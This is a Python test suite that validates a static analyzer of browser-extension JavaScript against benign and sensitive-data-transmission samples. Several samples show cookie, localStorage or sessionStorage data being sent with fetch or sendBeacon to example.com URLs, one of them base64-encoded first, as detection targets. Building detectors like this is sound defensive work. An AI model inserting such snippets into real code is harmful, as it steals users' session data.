"""
Static Analyzer Validation Test Suite

Purpose:
    Validate the existing static-analysis pipeline against:
    1. Benign JavaScript
    2. Suspicious-but-not-necessarily-malicious behavior
    3. Clear sensitive-data transmission
    4. Encoded sensitive-data transmission
    5. Interprocedural data flow
    6. Non-sensitive network activity

This test does NOT modify the analyzer.

Run:
    python test_static_validation.py
"""

from pathlib import Path
import shutil
import sys

from analyzer.ast_analyzer import analyze_javascript_file
from analyzer.data_flow_analyzer import analyze_data_flow
from analyzer.evidence_engine import analyze_evidence


# ============================================================
# CONFIGURATION
# ============================================================

TEST_ROOT = Path("Static_Validation_Tests")


# ============================================================
# TEST CASES
# ============================================================

TEST_CASES = [

    {
        "name": "01_benign_console",
        "category": "BENIGN",
        "description": "Normal logging without sensitive data",
        "code": """
console.log("Extension started");

const message = "Hello world";

console.log(message);
""",
        "expected_findings": 0,
    },

    {
        "name": "02_benign_network",
        "category": "BENIGN",
        "description": "Normal network request with a fixed value",
        "code": """
fetch("https://api.example.com/status", {
    method: "GET"
});
""",
        "expected_findings": 0,
    },

    {
        "name": "03_cookie_local_only",
        "category": "SUSPICIOUS",
        "description": "Cookie is accessed but never transmitted",
        "code": """
const cookieData = document.cookie;

console.log(cookieData);
""",
        "expected_findings": 0,
    },

    {
        "name": "04_localstorage_local_only",
        "category": "SUSPICIOUS",
        "description": "localStorage is accessed but never transmitted",
        "code": """
const storedData = localStorage.getItem("userData");

console.log(storedData);
""",
        "expected_findings": 0,
    },

    {
        "name": "05_cookie_fetch",
        "category": "MALICIOUS-LIKE",
        "description": "Cookie directly transmitted through fetch",
        "code": """
const cookieData = document.cookie;

fetch("https://example.com/collect", {
    method: "POST",
    body: cookieData
});
""",
        "expected_findings": 1,
    },

    {
        "name": "06_localstorage_fetch",
        "category": "MALICIOUS-LIKE",
        "description": "localStorage data transmitted through fetch",
        "code": """
const storedData = localStorage.getItem("userData");

fetch("https://example.com/collect", {
    method: "POST",
    body: storedData
});
""",
        "expected_findings": 1,
    },

    {
        "name": "07_sessionstorage_fetch",
        "category": "MALICIOUS-LIKE",
        "description": "sessionStorage data transmitted through fetch",
        "code": """
const sessionData = sessionStorage.getItem("session");

fetch("https://example.com/collect", {
    method: "POST",
    body: sessionData
});
""",
        "expected_findings": 1,
    },

    {
        "name": "08_location_fetch",
        "category": "SUSPICIOUS",
        "description": "Page location transmitted through fetch",
        "code": """
const currentPage = window.location;

fetch("https://example.com/page", {
    method: "POST",
    body: currentPage
});
""",
        "expected_findings": 1,
    },

    {
        "name": "09_cookie_encoded_fetch",
        "category": "MALICIOUS-LIKE",
        "description": "Cookie encoded with btoa before transmission",
        "code": """
const cookieData = document.cookie;

const encodedCookie = btoa(cookieData);

fetch("https://example.com/encoded", {
    method: "POST",
    body: encodedCookie
});
""",
        "expected_findings": 1,
    },

    {
        "name": "10_cookie_sendbeacon",
        "category": "MALICIOUS-LIKE",
        "description": "Cookie transmitted using sendBeacon",
        "code": """
const cookieData = document.cookie;

navigator.sendBeacon(
    "https://example.com/beacon",
    cookieData
);
""",
        "expected_findings": 1,
    },

    {
        "name": "11_cookie_function_return",
        "category": "MALICIOUS-LIKE",
        "description": "Cookie returned from a function and transmitted",
        "code": """
function getData() {
    return document.cookie;
}

const cookieData = getData();

fetch("https://example.com/return", {
    method: "POST",
    body: cookieData
});
""",
        "expected_findings": 1,
    },

    {
        "name": "12_cookie_function_parameter",
        "category": "MALICIOUS-LIKE",
        "description": "Cookie passed through a function parameter before transmission",
        "code": """
function sendData(data) {
    fetch("https://example.com/parameter", {
        method: "POST",
        body: data
    });
}

const cookieData = document.cookie;

sendData(cookieData);
""",
        "expected_findings": 1,
    },

    {
        "name": "13_cookie_json",
        "category": "SUSPICIOUS",
        "description": "Cookie serialized with JSON before transmission",
        "code": """
const cookieData = document.cookie;

const serialized = JSON.stringify(cookieData);

fetch("https://example.com/json", {
    method: "POST",
    body: serialized
});
""",
        "expected_findings": 1,
    },

    {
        "name": "14_multiple_benign_fetches",
        "category": "BENIGN",
        "description": "Several ordinary network requests without sensitive sources",
        "code": """
fetch("https://example.com/status");

fetch("https://example.com/config");

fetch("https://example.com/update");
""",
        "expected_findings": 0,
    },

    {
        "name": "15_cookie_unused",
        "category": "SUSPICIOUS",
        "description": "Cookie accessed but not used by a network sink",
        "code": """
const cookieData = document.cookie;

console.log("Cookie was read");

console.log(cookieData.length);
""",
        "expected_findings": 0,
    },
]


# ============================================================
# CREATE TEST ENVIRONMENT
# ============================================================

def create_test_environment():
    """
    Create the temporary validation-test directory.
    """

    if TEST_ROOT.exists():
        shutil.rmtree(TEST_ROOT)

    TEST_ROOT.mkdir(
        parents=True,
        exist_ok=True
    )


# ============================================================
# WRITE TEST CASE
# ============================================================

def write_test_case(test_case):
    """
    Write one JavaScript test case to disk.
    """

    test_directory = TEST_ROOT / test_case["name"]

    test_directory.mkdir(
        parents=True,
        exist_ok=True
    )

    js_file = test_directory / "background.js"

    js_file.write_text(
        test_case["code"].strip() + "\n",
        encoding="utf-8"
    )

    return js_file


# ============================================================
# EVIDENCE COUNT
# ============================================================

def safe_count_findings(evidence_result):
    """
    Extract the evidence count from the evidence-engine result.

    Supports the current evidence structure and a few compatible
    structures so that the validation script does not depend on
    one internal representation unnecessarily.
    """

    if not isinstance(evidence_result, dict):
        return 0

    evidence = evidence_result.get("evidence")

    if isinstance(evidence, list):
        return len(evidence)

    count = evidence_result.get("evidence_count")

    if isinstance(count, int):
        return count

    count = evidence_result.get("count")

    if isinstance(count, int):
        return count

    return 0


# ============================================================
# SENSITIVE FLOW STATUS
# ============================================================

def safe_sensitive_flow(evidence_result):
    """
    Determine whether the evidence engine reports a
    sensitive-data flow.
    """

    if not isinstance(evidence_result, dict):
        return False

    value = evidence_result.get(
        "sensitive_data_flow"
    )

    if isinstance(value, bool):
        return value

    value = evidence_result.get(
        "has_sensitive_data_flow"
    )

    if isinstance(value, bool):
        return value

    value = evidence_result.get(
        "sensitive_flow"
    )

    if isinstance(value, bool):
        return value

    return False


# ============================================================
# AST ANALYSIS
# ============================================================

def run_ast_analysis(js_file):
    """
    Run the existing AST analyzer.

    The current project exposes:
        analyze_javascript_file()
    """

    return analyze_javascript_file(
        str(js_file)
    )


# ============================================================
# DATA-FLOW ANALYSIS
# ============================================================

def run_data_flow_analysis(program_model):
    """
    Run the existing data-flow analyzer.
    """

    return analyze_data_flow(
        program_model
    )


# ============================================================
# EVIDENCE ANALYSIS
# ============================================================

def run_evidence_analysis(data_flow_result):
    """
    Run the existing evidence engine.
    """

    return analyze_evidence(
        data_flow_result
    )


# ============================================================
# SEPARATOR
# ============================================================

def print_separator():
    print("-" * 70)


# ============================================================
# TEST HEADER
# ============================================================

def print_test_header(
    index,
    total,
    test_case
):
    """
    Print information about the current test.
    """

    print()
    print("=" * 70)
    print(
        f"TEST {index}/{total}: "
        f"{test_case['name']}"
    )
    print("=" * 70)

    print(
        f"Category    : "
        f"{test_case['category']}"
    )

    print(
        f"Description : "
        f"{test_case['description']}"
    )

    print(
        f"Expected    : "
        f"{test_case['expected_findings']} finding(s)"
    )


# ============================================================
# ANALYSIS SUMMARY
# ============================================================

def print_analysis_summary(
    program_model,
    data_flow_result,
    evidence_result
):
    """
    Print a compact summary of the analysis.
    """

    print()
    print("Analysis Summary")
    print_separator()

    # --------------------------------------------------------
    # AST SUMMARY
    # --------------------------------------------------------

    if program_model is not None:

        syntax_error = getattr(
            program_model,
            "syntax_error",
            False
        )

        functions = getattr(
            program_model,
            "function_definitions",
            []
        )

        calls = getattr(
            program_model,
            "function_calls",
            []
        )

        assignments = getattr(
            program_model,
            "variable_assignments",
            []
        )

        print(
            f"Syntax Error        : "
            f"{syntax_error}"
        )

        print(
            f"Functions           : "
            f"{len(functions)}"
        )

        print(
            f"Function Calls      : "
            f"{len(calls)}"
        )

        print(
            f"Variable Assignments: "
            f"{len(assignments)}"
        )

    # --------------------------------------------------------
    # DATA-FLOW SUMMARY
    # --------------------------------------------------------

    if isinstance(
        data_flow_result,
        dict
    ):

        sources = data_flow_result.get(
            "sources",
            []
        )

        sinks = data_flow_result.get(
            "network_operations",
            []
        )

        findings = data_flow_result.get(
            "findings",
            []
        )

        print(
            f"Security Sources    : "
            f"{len(sources)}"
        )

        print(
            f"Network Sinks       : "
            f"{len(sinks)}"
        )

        print(
            f"Data-Flow Findings  : "
            f"{len(findings)}"
        )

    # --------------------------------------------------------
    # EVIDENCE SUMMARY
    # --------------------------------------------------------

    evidence_count = safe_count_findings(
        evidence_result
    )

    sensitive_flow = safe_sensitive_flow(
        evidence_result
    )

    print(
        f"Evidence Findings   : "
        f"{evidence_count}"
    )

    print(
        f"Sensitive Flow      : "
        f"{sensitive_flow}"
    )


# ============================================================
# PRINT DATA-FLOW FINDINGS
# ============================================================

def print_data_flow_findings(
    data_flow_result
):
    """
    Print detected data-flow findings.

    This is especially useful when a validation test fails.
    """

    if not isinstance(
        data_flow_result,
        dict
    ):
        return

    findings = data_flow_result.get(
        "findings",
        []
    )

    if not findings:
        print()
        print("No data-flow findings detected.")
        return

    print()
    print("Detected Data-Flow Findings")
    print_separator()

    for number, finding in enumerate(
        findings,
        start=1
    ):

        if not isinstance(
            finding,
            dict
        ):

            print(
                f"Finding #{number}: "
                f"{finding}"
            )

            continue

        source = finding.get(
            "source"
        )

        sink = finding.get(
            "sink"
        )

        sink_line = finding.get(
            "sink_line"
        )

        destination = finding.get(
            "destination"
        )

        flow_type = finding.get(
            "flow_type"
        )

        print(
            f"Finding #{number}:"
        )

        print(
            f"    Source      : "
            f"{source}"
        )

        print(
            f"    Sink        : "
            f"{sink}"
        )

        print(
            f"    Sink Line   : "
            f"{sink_line}"
        )

        print(
            f"    Destination : "
            f"{destination}"
        )

        print(
            f"    Flow Type   : "
            f"{flow_type}"
        )


# ============================================================
# SINGLE TEST
# ============================================================

def run_single_test(
    index,
    total,
    test_case
):
    """
    Execute one validation test.

    Returns:
        True  -> test passed
        False -> test failed
    """

    print_test_header(
        index,
        total,
        test_case
    )

    js_file = write_test_case(
        test_case
    )

    try:

        # ====================================================
        # AST
        # ====================================================

        print()
        print("[1] AST Analysis")

        program_model = run_ast_analysis(
            js_file
        )

        if program_model is None:

            print(
                "FAIL: AST analyzer returned None."
            )

            return False

        syntax_error = getattr(
            program_model,
            "syntax_error",
            False
        )

        if syntax_error:

            print(
                "FAIL: JavaScript contains "
                "a syntax error."
            )

            return False

        print(
            "PASS: AST analysis completed."
        )

        # ====================================================
        # DATA FLOW
        # ====================================================

        print()
        print("[2] Data-Flow Analysis")

        data_flow_result = run_data_flow_analysis(
            program_model
        )

        if data_flow_result is None:

            print(
                "FAIL: Data-flow analyzer "
                "returned None."
            )

            return False

        print(
            "PASS: Data-flow analysis completed."
        )

        # ====================================================
        # EVIDENCE
        # ====================================================

        print()
        print("[3] Evidence Analysis")

        evidence_result = run_evidence_analysis(
            data_flow_result
        )

        if evidence_result is None:

            print(
                "FAIL: Evidence engine "
                "returned None."
            )

            return False

        print(
            "PASS: Evidence analysis completed."
        )

        # ====================================================
        # SUMMARY
        # ====================================================

        print_analysis_summary(
            program_model,
            data_flow_result,
            evidence_result
        )

        # ====================================================
        # VALIDATION
        # ====================================================

        actual_findings = safe_count_findings(
            evidence_result
        )

        expected_findings = test_case[
            "expected_findings"
        ]

        print()
        print("Validation")
        print_separator()

        print(
            f"Expected findings : "
            f"{expected_findings}"
        )

        print(
            f"Actual findings   : "
            f"{actual_findings}"
        )

        # ----------------------------------------------------
        # PASS
        # ----------------------------------------------------

        if actual_findings == expected_findings:

            print()
            print("RESULT: PASS")

            return True

        # ----------------------------------------------------
        # FAIL
        # ----------------------------------------------------

        print()
        print("RESULT: FAIL")

        print(
            "The analyzer produced a different "
            "number of evidence findings than expected."
        )

        print_data_flow_findings(
            data_flow_result
        )

        return False

    except Exception as exc:

        print()
        print("RESULT: ERROR")

        print(
            f"Error Type : "
            f"{type(exc).__name__}"
        )

        print(
            f"Error      : "
            f"{exc}"
        )

        print()
        print(
            "This test stopped because one of "
            "the existing analyzer components "
            "raised an exception."
        )

        return False


# ============================================================
# FINAL REPORT
# ============================================================

def print_final_report(
    results
):
    """
    Print final validation statistics.
    """

    total = len(results)

    passed = sum(
        1
        for result in results
        if result["passed"]
    )

    failed = total - passed

    print()
    print()
    print("#" * 70)
    print(
        "STATIC ANALYZER VALIDATION REPORT"
    )
    print("#" * 70)

    print()

    print(
        f"Total Tests : "
        f"{total}"
    )

    print(
        f"Passed      : "
        f"{passed}"
    )

    print(
        f"Failed      : "
        f"{failed}"
    )

    if total > 0:

        pass_rate = (
            passed / total
        ) * 100

        print(
            f"Validation Pass Rate : "
            f"{pass_rate:.1f}%"
        )

    # ========================================================
    # RESULTS
    # ========================================================

    print()
    print("Test Results")
    print_separator()

    for result in results:

        status = (
            "PASS"
            if result["passed"]
            else "FAIL"
        )

        print(
            f"[{status}] "
            f"{result['name']} "
            f"({result['category']})"
        )

    # ========================================================
    # FINAL STATUS
    # ========================================================

    print()

    if failed == 0:

        print("=" * 70)
        print(
            "ALL STATIC VALIDATION TESTS PASSED"
        )
        print("=" * 70)

        print()

        print(
            "The current static-analysis pipeline "
            "successfully handled the validation corpus."
        )

        print()

        print(
            "Next stage:"
        )

        print(
            "Expand the corpus with more realistic "
            "browser-extension patterns and measure "
            "false positives and false negatives."
        )

    else:

        print("=" * 70)
        print(
            "STATIC VALIDATION REQUIRES INVESTIGATION"
        )
        print("=" * 70)

        print()

        print(
            "Do NOT modify the analyzer immediately."
        )

        print(
            "First inspect the failed test cases "
            "to determine whether the expected behavior "
            "or the analyzer implementation is responsible."
        )


# ============================================================
# CLEANUP
# ============================================================

def cleanup():
    """
    Remove the temporary validation-test directory.
    """

    if not TEST_ROOT.exists():
        return

    try:

        shutil.rmtree(
            TEST_ROOT
        )

    except Exception as exc:

        print()

        print(
            f"Warning: Could not remove "
            f"{TEST_ROOT}: {exc}"
        )


# ============================================================
# MAIN
# ============================================================

def main():

    print("=" * 70)
    print(
        "STATIC ANALYZER VALIDATION TEST SUITE"
    )
    print("=" * 70)

    print()

    print(
        "Purpose:"
    )

    print(
        "Validate the existing AST, data-flow, "
        "and evidence-analysis pipeline against "
        "benign, suspicious, and sensitive-data "
        "transmission scenarios."
    )

    print()

    print(
        f"Number of test cases: "
        f"{len(TEST_CASES)}"
    )

    # --------------------------------------------------------
    # Create temporary test environment
    # --------------------------------------------------------

    create_test_environment()

    results = []

    try:

        total = len(
            TEST_CASES
        )

        for index, test_case in enumerate(
            TEST_CASES,
            start=1
        ):

            passed = run_single_test(
                index,
                total,
                test_case
            )

            results.append(
                {
                    "name": test_case["name"],
                    "category": test_case["category"],
                    "passed": passed,
                }
            )

        # ----------------------------------------------------
        # Final report
        # ----------------------------------------------------

        print_final_report(
            results
        )

    finally:

        # ----------------------------------------------------
        # Always remove temporary files
        # ----------------------------------------------------

        cleanup()

    # --------------------------------------------------------
    # Exit status
    # --------------------------------------------------------

    failed = sum(
        1
        for result in results
        if not result["passed"]
    )

    if failed > 0:
        return 1

    return 0


# ============================================================
# PROGRAM ENTRY POINT
# ============================================================

if __name__ == "__main__":

    sys.exit(
        main()
    )